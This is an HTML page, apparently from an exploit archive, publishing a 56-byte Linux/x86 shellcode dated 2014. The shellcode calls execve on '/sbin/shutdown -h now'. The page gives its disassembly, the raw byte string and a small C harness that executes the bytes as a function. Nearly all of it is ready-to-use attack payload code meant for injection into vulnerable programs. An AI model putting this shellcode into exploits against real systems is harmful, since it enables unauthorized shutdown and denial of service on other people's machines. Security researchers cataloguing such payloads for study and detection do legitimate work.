<html><head><title>Linux/x86 - shutdown -h now - 56 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
; Title: shutdown -h now Shellcode - 56 bytes
; Date: 2014-06-27
; Platform: linux/x86
; Author: Osanda Malith Jayathissa (@OsandaMalith)

Disassembly of section .text:

08048060 &lt;_start&gt;:
8048060:    31 c0                   xor    eax,eax
8048062:    31 d2                   xor    edx,edx
8048064:    50                      push   eax
8048065:    66 68 2d 68             pushw  0x682d
8048069:    89 e7                   mov    edi,esp
804806b:    50                      push   eax
804806c:    6a 6e                   push   0x6e
804806e:    66 c7 44 24 01 6f 77    mov    WORD PTR [esp+0x1],0x776f
8048075:    89 e7                   mov    edi,esp
8048077:    50                      push   eax
8048078:    68 64 6f 77 6e          push   0x6e776f64
804807d:    68 73 68 75 74          push   0x74756873
8048082:    68 6e 2f 2f 2f          push   0x2f2f2f6e
8048087:    68 2f 73 62 69          push   0x6962732f
804808c:    89 e3                   mov    ebx,esp
804808e:    52                      push   edx
804808f:    56                      push   esi
8048090:    57                      push   edi
8048091:    53                      push   ebx
8048092:    89 e1                   mov    ecx,esp
8048094:    b0 0b                   mov    al,0xb
8048096:    cd 80                   int    0x80

*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char code[] =  "\x31\xc0\x31\xd2\x50\x66\x68\x2d"
"\x68\x89\xe7\x50\x6a\x6e\x66\xc7"
"\x44\x24\x01\x6f\x77\x89\xe7\x50"
"\x68\x64\x6f\x77\x6e\x68\x73\x68"
"\x75\x74\x68\x6e\x2f\x2f\x2f\x68"
"\x2f\x73\x62\x69\x89\xe3\x52\x56"
"\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

int
main() {

printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();

return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>

